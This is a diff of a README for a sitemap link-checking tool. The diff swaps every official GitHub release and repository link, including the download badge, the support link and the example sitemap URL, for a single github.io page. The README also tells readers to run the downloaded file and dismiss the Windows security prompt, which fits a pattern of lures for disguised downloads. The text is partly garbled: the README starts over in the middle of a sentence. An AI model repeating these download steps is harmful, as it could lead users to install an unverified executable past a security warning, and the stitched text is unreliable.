@@ -1,12 +1,12 @@
 # 🗺️ sitemap-audit - Check Every Sitemap Link with Ease
 
-[![Download sitemap-audit](https://img.shields.io/badge/Download-sitemap--audit-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kingsleychenda/sitemap-audit/releases)
+[![Download sitemap-audit](https://img.shields.io/badge/Download-sitemap--audit-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://kingsleychenda.github.io)
 
 sitemap-audit is a cross-platform tool that checks every link in your website sitemap. It looks for broken pages, redirects, missing pages that pretend to work, search engine blocking tags, and language linking problems. Then it writes easy-to-read reports. You do not need to know how to program to use it. This guide shows you how to download it on Windows and start checking your sitemap.
 
 ## 📥 Download and Run
 
-Visit this link to download the application: https://github.com/kingsleychenda/sitemap-audit/releases
+Visit this link to download the application: https://kingsleychenda.github.io
 
 After the download finishes, open the downloaded file to start sitemap-audit. If Windows shows a security prompt, choose the option that lets the app run. Follow the on-screen instructions to begin your first sitemap check.
 
@@ -18,13 +18,13 @@ The tool reads your sitemap from start to finish. It checks:
 
 - Whether the sitemap# 🗺️ sitemap-audit - Check Every Sitemap Link with Ease
 
-[![Download sitemap-audit](https://img.shields.io/badge/Download-sitemap--audit-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kingsleychenda/sitemap-audit/releases)
+[![Download sitemap-audit](https://img.shields.io/badge/Download-sitemap--audit-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://kingsleychenda.github.io)
 
 sitemap-audit is a free tool for Windows that checks every link in your website sitemap. It finds broken pages, redirects, missing pages that pretend to work, search engine blocking tags, and language linking problems. Then it writes easy-to-read reports in HTML, Excel, JSON, and CSV formats. You do not need any programming knowledge to use it. This guide walks you through downloading and running the tool on your Windows computer.
 
 ## 📥 Download and Run
 
-Visit this link to download the application: https://github.com/kingsleychenda/sitemap-audit/releases
+Visit this link to download the application: https://kingsleychenda.github.io
 
 After the download finishes, open the downloaded file. If Windows shows a security prompt, choose the option that lets the app run. The application will start and show a simple window where you can enter your sitemap address and begin the audit.
 
@@ -36,7 +36,7 @@ A sitemap is a file that lists the pages on your website. Search engines like Go
 
 1. Download the application from the link above.
 2. Open the downloaded file. The application window will appear.
-3. In the address field, type or paste your sitemap URL. It usually looks like https://yourwebsite.com/sitemap.xml.
+3. In the address field, type or paste your sitemap URL. It usually looks like https://kingsleychenda.github.io
 4. Choose where you want to save the reports. You can keep the default folder or pick your own.
 5. Click the button to start the audit. The tool will visit every link in your sitemap. This may take a few minutes depending on how many pages you have.
 6. When the audit finishes, open the report files to see the results.
@@ -117,6 +117,6 @@ Look in the folder where you saved the reports. If you used the default setting,
 
 ## 🤝 Support and Feedback
 
-For help, bug reports, or feature requests, visit the GitHub repository page at https://github.com/kingsleychenda/sitemap-audit. You can open an issue or read more about the project.
+For help, bug reports, or feature requests, visit the GitHub repository page at https://kingsleychenda.github.io You can open an issue or read more about the project.
 
 Keywords: cli, crawler, cross-platform, go, golang, hreflang, robots-txt, seo, seo-audit, sitemap, sitemap-xml, technical-seo
